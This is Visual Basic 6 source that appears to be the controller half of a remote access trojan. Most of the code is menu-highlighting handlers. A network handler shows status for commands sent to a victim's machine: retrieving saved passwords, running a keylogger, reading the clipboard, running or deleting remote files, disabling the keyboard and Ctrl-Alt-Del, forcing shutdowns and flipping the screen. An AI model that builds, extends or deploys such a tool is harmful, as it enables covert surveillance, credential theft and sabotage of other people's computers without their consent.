Private Sub picbrighten_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &H8
shpinvert.FillColor = &H8
shpbad.FillColor = &H8
shpdark.FillColor = &H8
shpbright.FillColor = &H800000
End Sub

Private Sub lblbright_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpbright.FillColor = &HFF8080
End Sub

Private Sub lblbright_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &H8
shpinvert.FillColor = &H8
shpbad.FillColor = &H8
shpdark.FillColor = &H8
shpbright.FillColor = &H800000
End Sub

Private Sub picchat_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtnick.BackColor = &HFF8080
lblvictimchat.BackColor = &H8
End Sub

Private Sub picdarken_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpdark.FillColor = &HFF8080
End Sub

Private Sub picdarken_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &H8
shpinvert.FillColor = &H8
shpbad.FillColor = &H8
shpbright.FillColor = &H8
shpdark.FillColor = &H800000
End Sub

Private Sub lbldark_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpdark.FillColor = &HFF8080
End Sub

Private Sub lbldark_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &H8
shpinvert.FillColor = &H8
shpbad.FillColor = &H8
shpbright.FillColor = &H8
shpdark.FillColor = &H800000
End Sub

Private Sub picdesktop_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblopenscreen.BackColor = &H8
lblfullscreen.BackColor = &H8
End Sub

Private Sub picclipboard_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblreadclip.BackColor = &H8
lblsetclip.BackColor = &H8
lblemptyclip.BackColor = &H8
End Sub

Private Sub picflipscreen_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &H8
shpinvert.FillColor = &H8
shpbad.FillColor = &H8
shpdark.FillColor = &H8
shpbright.FillColor = &H8
lblflipscreen.BackColor = &H8
shpvertical.FillColor = &H8
shphorizontal.FillColor = &H8
End Sub

Private Sub pichorizontal_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shphorizontal.FillColor = &H800000
End Sub

Private Sub picinfo_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblretrieve.BackColor = &H8
End Sub

Private Sub picinvert_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpinvert.FillColor = &HFF8080
End Sub

Private Sub picinvert_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &H8
shpbad.FillColor = &H8
shpdark.FillColor = &H8
shpbright.FillColor = &H8
shpinvert.FillColor = &H800000
End Sub

Private Sub lblinvert_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpinvert.FillColor = &HFF8080
End Sub

Private Sub lblinvert_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &H8
shpbad.FillColor = &H8
shpdark.FillColor = &H8
shpbright.FillColor = &H8
shpinvert.FillColor = &H800000
End Sub

Private Sub pickeyboard_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbllogger.BackColor = &H8
lblsendkeys.BackColor = &H8
lbldisable.BackColor = &H8
End Sub

Private Sub picmatrix_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblactivate.BackColor = &H8
lbldeactivate.BackColor = &H8
End Sub

Private Sub picnormal_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &HFF8080
End Sub

Private Sub lblnormal_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpnormal.FillColor = &HFF8080
End Sub

Private Sub picnormal_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpinvert.FillColor = &H8
shpbad.FillColor = &H8
shpdark.FillColor = &H8
shpbright.FillColor = &H8
shpnormal.FillColor = &H800000
End Sub

Private Sub picpassword_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblretrievepass.BackColor = &H8
lblsavepass.BackColor = &H8
End Sub

Private Sub picserver_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblclose.BackColor = &H8
End Sub

Private Sub Picture10_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblscreensave.BackColor = &H8
lblrestart.BackColor = &H8
lblmouse.BackColor = &H8
lbltime.BackColor = &H8
cmdConnect.BackColor = &H8
lblextra.BackColor = &H8
End Sub

Private Sub Picture39_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpvertical.FillColor = &H8
shphorizontal.FillColor = &H8
End Sub

Private Sub Picture40_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpvertical.FillColor = &H8
shphorizontal.FillColor = &H8
End Sub

Private Sub Picture6_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblConnect.BackColor = &H8
lblGetinfo.BackColor = &H8
lblServer.BackColor = &H8
lblIpnotify.BackColor = &H8
cmdKey.BackColor = &H8
End Sub

Private Sub Picture7_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblkeyboard.BackColor = &H8
lblchat.BackColor = &H8
lblmatrix.BackColor = &H8
lblmsg.BackColor = &H8
cmdMisc.BackColor = &H8
End Sub

Private Sub Picture8_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblpassword.BackColor = &H8
lblfilemngr.BackColor = &H8
lblclipmngr.BackColor = &H8
cmdFun.BackColor = &H8
End Sub

Private Sub Picture9_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldesktop.BackColor = &H8
lblflip.BackColor = &H8
lblbrowser.BackColor = &H8
lblprint.BackColor = &H8
lblwincolour.BackColor = &H8
cmdXtra.BackColor = &H8
End Sub

Private Sub picvertical_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
shpvertical.FillColor = &H800000
End Sub

Private Sub title_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = vbLeftButton Then
    FirstX = X
    FirstY = Y
End If
End Sub

Private Sub title_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = vbLeftButton Then
    Me.Left = Me.Left + (X - FirstX)
    Me.Top = Me.Top + (Y - FirstY)
End If
cmdX.BackColor = &HFF8080
End Sub

Private Sub cmdConnect_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    cmdConnect.BackColor = &HFFC0C0
End Sub

Private Sub cmdConnect_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
cmdConnect.BackColor = &HFF8080
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblGetinfo.BackColor = &H8
lblServer.BackColor = &H8
lblIpnotify.BackColor = &H8
End Sub

Private Sub tmrleft_Timer()
picleft.Visible = True
picleft.Left = picleft.Left - 50
If picleft.Left <= statusbar.Left - 1000 Then
tmrleft.Enabled = False
picleft.Visible = False
picleft.Left = 1000
Picright.Visible = True
tmrright.Enabled = True
End If
End Sub

Private Sub tmrright_Timer()
Picright.Visible = True
Picright.Left = Picright.Left + 50
If Picright.Left >= statusbar.Left + statusbar.Width Then
tmrright.Enabled = False
Picright.Visible = False
Picright.Left = -1000
tmrleft.Enabled = True
End If
End Sub

Private Sub tmrsizedown_Timer()
txtsize.Text = txtsize.Text - 1
If txtsize.Text = 1 Then
tmrsizedown.Enabled = False
End If
End Sub

Private Sub tmrsizeup_Timer()
txtsize.Text = txtsize.Text + 1
If txtsize.Text = 99 Then
tmrsizeup.Enabled = False
End If
End Sub

Private Sub txtclipboard_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblreadclip.BackColor = &H8
lblsetclip.BackColor = &H8
lblemptyclip.BackColor = &H8
End Sub

Private Sub txtnick_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
txtnick.BackColor = &H800000
End Sub

Private Sub txtpass_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblretrievepass.BackColor = &H8
lblsavepass.BackColor = &H8
End Sub

Private Sub txtsize_KeyPress(KeyAscii As Integer)
If KeyAscii = vbKeyReturn Then
txtprint.FontSize = txtsize.Text
End If
End Sub

Private Sub txturl_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
txturl.BackColor = &H800000
End Sub


Private Sub WS_Close()
WS.Close
frmFile.File.Close
Status.Caption = "damn' it! disconnected..."
tmrright.Enabled = False
End Sub

Private Sub WS_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
WS.GetData Data, vbString, bytesTotal
lastdata$ = Data
Arrayize lastdata$, ";"
Dim thedata As String

If Cmd(0) = "Connected" Then
Status.Caption = "connected to " & txtIp.Text & " on port " & txtPort.Text
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "Disconnected" Then
Status.Caption = "damn' it! disconnected..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "NumLockOn" Then
Status.Caption = "numlock is now on..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "NumLockOff" Then
Status.Caption = "numlock is now off..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "CapsLockOn" Then
Status.Caption = "capslock is now on..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "CapsLockOff" Then
Status.Caption = "capslock is now off..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False
    
ElseIf Cmd(0) = "ScrollLockOn" Then
Status.Caption = "scrolllock is now on..."
    tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    
ElseIf Cmd(0) = "ScrollLockOff" Then
Status.Caption = "scrolllock is now off..."
    tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    
ElseIf Cmd(0) = "CtrlAltDelOn" Then
Status.Caption = "ctrl alt del is now enabled..."
    tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    
ElseIf Cmd(0) = "CtrlAltDelOff" Then
Status.Caption = "ctrl alt del is no disabled..."
    tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    
ElseIf Cmd(0) = "MonitorOn" Then
 Status.Caption = "monitor is now on..."
 tmrright.Enabled = False
 picleft.Visible = False
Picright.Visible = False
 
ElseIf Cmd(0) = "MonitorOff" Then
Status.Caption = "monitor is now off..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "CDOpened" Then
Status.Caption = "the cd drive is now open..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "CDClosed" Then
Status.Caption = "the cd drive is now closed..."
    tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    
ElseIf Cmd(0) = "TaskBarHidden" Then
Status.Caption = "the taskbar is now hidden..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "TaskBarShown" Then
Status.Caption = "the taskbar is now showing..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "StartButtonHidden" Then
Status.Caption = "the start button is now hidden..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "StartButtonShown" Then
Status.Caption = "the start button is now showing..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "DesktopHidden" Then
Status.Caption = "the desktop icons are now hidden..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "DesktopShown" Then
Status.Caption = "the desktop icons are now showing..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "MouseButtonsReversed" Then
Status.Caption = "the mouse buttons have been reversed..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "MouseButtonsRestored" Then
Status.Caption = "the mouse buttons have been restored..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "MouseHidden" Then
Status.Caption = "the mouse is now hidden..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "MouseShown" Then
Status.Caption = "the mouse is now showing..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "ServerClosed" Then
 Status.Caption = "damn' it! disconnected..."
 tmrright.Enabled = False
 picleft.Visible = False
Picright.Visible = False
 
  ElseIf Cmd(0) = "NormalShutdown" Then
 Status.Caption = "windows has been shutdown..."
 tmrright.Enabled = False
 picleft.Visible = False
Picright.Visible = False
 
  ElseIf Cmd(0) = "ForceShutdown" Then
Status.Caption = "forced windows shutdown..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "LogOff" Then
 Status.Caption = "logged off windows user..."
 tmrright.Enabled = False
 picleft.Visible = False
Picright.Visible = False
 
  ElseIf Cmd(0) = "Reboot" Then
Status.Caption = "rebooted remote computer..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "Reboot" Then
Status.Caption = "powered off remote computer..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipVerticalNormal" Then
Status.Caption = "flipped screen vertical w/ normal colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipVerticalInvert" Then
Status.Caption = "flipped screen vertical w/ inverted colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipVerticalBad" Then
Status.Caption = "flipped screen vertical w/ bad colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipVerticalDark" Then
Status.Caption = "flipped screen vertical w/ dark colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipVerticalBright" Then
Status.Caption = "flipped screen vertical w/ bright colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

 ElseIf Cmd(0) = "FlipHorizontalNormal" Then
Status.Caption = "flipped screen horizontal w/ normal colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipHorizontalInvert" Then
Status.Caption = "flipped screen horizontal w/ inverted colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipHorizontalBad" Then
Status.Caption = "flipped screen horizontal w/ bad colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipHorizontalDark" Then
Status.Caption = "flipped screen horizontal w/ dark colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipHorizontalBright" Then
Status.Caption = "flipped screen horizontal w/ bright colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipBothNormal" Then
Status.Caption = "flipped screen both ways w/ normal colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipBothInvert" Then
Status.Caption = "flipped screen both ways w/ inverted colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipBothBad" Then
Status.Caption = "flipped screen both ways w/ bad colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipBothDark" Then
Status.Caption = "flipped screen both ways w/ dark colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

  ElseIf Cmd(0) = "FlipBothBright" Then
Status.Caption = "flipped screen both ways w/ bright colors..."
tmrright.Enabled = False
picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "Info" Then
    txtInfo.Text = Cmd(1)
    Status.Caption = "data retrieved..."
    tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "ClipText" Then
    txtclipboard.Text = Cmd(1)
    Status.Caption = "clipboard text received..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "ClipBoardSet" Then
Status.Caption = "new clipboard text has been set..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "ClipCleared" Then
Status.Caption = "clipboard has been cleared..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "SSSaved" Then
Status.Caption = "new screensaver settings saved..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    
ElseIf Cmd(0) = "ColorsRestored" Then
Status.Caption = "colors restored..."
        tmrright.Enabled = False
        tmrleft.Enabled = False
    picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "ColorsChanged" Then
Status.Caption = "colors changed..."
        tmrright.Enabled = False
        tmrleft.Enabled = False
    picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "TrailChanged" Then
Status.Caption = "mouse trail has been changed..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "NoMouseTrail" Then
Status.Caption = "mouse trail has been removed..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    
ElseIf Cmd(0) = "Passwords" Then
txtpass.Text = Cmd(1)
Status.Caption = "passwords retrieved..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False

ElseIf Cmd(0) = "NoPasswords" Then
Status.Caption = "no passwords found..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    End If

If Cmd(0) = "ScreenSaveRun" Then
Status.Caption = "screensaver is running..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    End If
    
    If Cmd(0) = "Files" Then
    DispFiles Cmd(1)
    Status.Caption = "remote file list received..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    End If
    
    If Cmd(0) = "TextPrinted" Then
    Status.Caption = "finished printing text..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    End If

If Cmd(0) = "BrowserOpened" Then
    Status.Caption = "web browser opened..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    End If

If Cmd(0) = "TimeDate" Then
txttime.Text = Cmd(1)
txtdate.Text = Cmd(2)
    Status.Caption = "time and date received..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
    End If
    
    If Cmd(0) = "TimeSet" Then
        Status.Caption = "time changed..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
ElseIf Cmd(0) = "DateSet" Then
    Status.Caption = "date changed..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "LogStarted" Then
Status.Caption = "online keylogger running..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "LogStopped" Then
Status.Caption = "online keylogger stopped..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "KeyboardDisabled" Then
Status.Caption = "keyboard disabled [they will need to reboot]..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "ChatInitiated" Then
Status.Caption = "chat initiated..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "ChatMessage" Then
frmChat.txtchat.Text = Cmd(1)
End If

If Cmd(0) = "ChatClosed" Then
Status.Caption = "chat closed..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "WavPlayed" Then
Status.Caption = "wav file played..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "FileRun" Then
Status.Caption = "remote file ran..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "WavError" Then
Status.Caption = "error playing wav file..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "FileError" Then
Status.Caption = "error running remote file..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "FileDeleted" Then
Status.Caption = "remote file deleted..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If

If Cmd(0) = "Drives" Then
DispDrives Cmd(1)
frmDrives.Show
Status.Caption = "drives recieved..."
        tmrright.Enabled = False
    picleft.Visible = False
Picright.Visible = False
End If
End Sub

Private Sub lbllogger_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbllogger.BackColor = &HFFC0C0
End Sub

Private Sub lbllogger_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbllogger.BackColor = &H800000
End Sub

Private Sub lblsendkeys_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsendkeys.BackColor = &HFFC0C0
End Sub

Private Sub lblsendkeys_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsendkeys.BackColor = &H800000
End Sub

Private Sub lbldisable_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldisable.BackColor = &HFFC0C0
End Sub

Private Sub lbldisable_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldisable.BackColor = &H800000
End Sub

Private Sub lblvictimChat_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblvictimchat.BackColor = &HFFC0C0
End Sub

Private Sub lblvictimChat_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblvictimchat.BackColor = &H800000
End Sub

Private Sub lblactivate_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblactivate.BackColor = &HFFC0C0
End Sub

Private Sub lblactivate_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblactivate.BackColor = &H800000
End Sub

Private Sub lbldeactivate_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldeactivate.BackColor = &HFFC0C0
End Sub

Private Sub lbldeactivate_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbldeactivate.BackColor = &H800000
End Sub

Private Sub lblretrievepass_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsavepass.BackColor = &H8
lblretrievepass.BackColor = &H800000
End Sub

Private Sub lblretrievepass_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblretrievepass.BackColor = &HFFC0C0
End Sub

Private Sub lblsavepass_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblretrievepass.BackColor = &H8
lblsavepass.BackColor = &H800000
End Sub

Private Sub lblsavepass_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsavepass.BackColor = &HFFC0C0
End Sub

Private Sub lblopenscreen_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblopenscreen.BackColor = &HFFC0C0
End Sub

Private Sub lblopenscreen_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblfullscreen.BackColor = &H8
lblopenscreen.BackColor = &H800000
End Sub

Private Sub lblfullscreen_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblfullscreen.BackColor = &HFFC0C0
End Sub

Private Sub lblfullscreen_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblopenscreen.BackColor = &H8
lblfullscreen.BackColor = &H800000
End Sub

Private Sub lblreadclip_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblreadclip.BackColor = &HFFC0C0
End Sub

Private Sub lblreadclip_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsetclip.BackColor = &H8
lblreadclip.BackColor = &H800000
End Sub

Private Sub lblsetclip_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsetclip.BackColor = &HFFC0C0
End Sub

Private Sub lblsetclip_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblreadclip.BackColor = &H8
lblsetclip.BackColor = &H800000
End Sub

Private Sub lblemptyclip_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblemptyclip.BackColor = &HFFC0C0
End Sub

Private Sub lblemptyclip_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblemptyclip.BackColor = &H800000
End Sub

Private Sub lblopenbrowser_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblopenbrowser.BackColor = &HFFC0C0
End Sub

Private Sub lblopenbrowser_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblopenbrowser.BackColor = &H800000
End Sub

Private Sub lblitalic_Mouseup(Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblitalic.BackColor = &H800000 Then
lblitalic.BackColor = &H8
Else: lblitalic.BackColor = &H800000
End If
If lblitalic.BackColor = &H800000 Then
txtprint.FontItalic = True
Else: txtprint.FontItalic = False
End If
End Sub

Private Sub lblunderline_Mouseup(Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblunderline.BackColor = &H800000 Then
lblunderline.BackColor = &H8
Else: lblunderline.BackColor = &H800000
End If
If lblunderline.BackColor = &H800000 Then
txtprint.FontUnderline = True
Else: txtprint.FontUnderline = False
End If
End Sub

Private Sub lblstrike_Mouseup(Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblstrike.BackColor = &H800000 Then
lblstrike.BackColor = &H8
Else: lblstrike.BackColor = &H800000
End If
If lblstrike.BackColor = &H800000 Then
txtprint.FontStrikethru = True
Else: txtprint.FontStrikethru = False
End If
End Sub

Private Sub lblprinttext_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblprinttext.BackColor = &HFFC0C0
End Sub

Private Sub lblprinttext_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblprinttext.BackColor = &H800000
End Sub

Private Sub lblnormalshutdown_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblnormalshutdown.BackColor = &HFFC0C0
End Sub

Private Sub lblnormalshutdown_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblnormalshutdown.BackColor = &H800000
End Sub

Private Sub lblforceshutdown_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblforceshutdown.BackColor = &HFFC0C0
End Sub

Private Sub lblforceshutdown_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblforceshutdown.BackColor = &H800000
End Sub

Private Sub lbllogoff_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbllogoff.BackColor = &HFFC0C0
End Sub

Private Sub lbllogoff_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lbllogoff.BackColor = &H800000
End Sub

Private Sub lblpoweroff_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblpoweroff.BackColor = &HFFC0C0
End Sub

Private Sub lblpoweroff_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblpoweroff.BackColor = &H800000
End Sub

Private Sub lblreboot_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblreboot.BackColor = &HFFC0C0
End Sub

Private Sub lblreboot_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblreboot.BackColor = &H800000
End Sub

Private Sub lblsettime_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsettime.BackColor = &HFFC0C0
End Sub

Private Sub lblsettime_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsettime.BackColor = &H800000
End Sub

Private Sub lblsetdate_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsetdate.BackColor = &HFFC0C0
End Sub

Private Sub lblsetdate_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblsetdate.BackColor = &H800000
End Sub

Private Sub lblgettimedate_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblgettimedate.BackColor = &HFFC0C0
End Sub

Private Sub lblgettimedate_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblgettimedate.BackColor = &H800000
End Sub

Private Sub lblextra_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblextra.BackColor = &HFFC0C0
End Sub

Private Sub lblextra_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblextra.BackColor = &H800000
lbltime.BackColor = &H8
lblrestart.BackColor = &H8
lblmouse.BackColor = &H8
lblscreensave.BackColor = &H8
cmdConnect.BackColor = &H8
cmdKey.BackColor = &H8
cmdMisc.BackColor = &H8
cmdFun.BackColor = &H8
cmdXtra.BackColor = &H8
lblConnect.BackColor = &H8
End Sub

Private Sub WS_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
WS.Close
Status.Caption = "damn' it! disconnected..."
tmrright.Enabled = False
End Sub
